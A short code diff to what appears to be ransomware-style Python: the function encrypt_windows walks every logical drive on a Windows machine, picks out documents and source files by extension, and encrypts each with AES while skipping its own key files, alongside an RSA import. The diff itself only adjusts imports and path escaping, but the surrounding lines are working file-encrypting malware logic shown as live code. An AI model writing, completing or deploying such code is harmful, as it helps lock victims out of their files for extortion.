@@ -1,8 +1,9 @@
 import base64
-import os
+import os,time
 import win32api
 from aes import aes_encrypt
 import RSA as Rencrypt
+
 def encrypt_windows():
     count=1
     for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
@@ -17,7 +18,8 @@ def encrypt_windows():
                 if(ext == "docx" or ext == "txt" or ext == "pptx" or ext == "pdf" or ext == "json" or ext == "html" or ext == "css" or ext == "js" or ext == "c" or ext == "java" or ext=="py"):
                     try:
                         path = str(os.path.join(root, f))
-                        if("\\\\res\\\\" in path and ("temp_key" in path or "key" in path)):
+                        path1 = path.replace('\\','\\\\')
+                        if("\\res\\" in path1 and ("temp_key" in path1 or "key" in path1)):
                             continue
                         aes_encrypt(path)
                         if(count % 3==0):
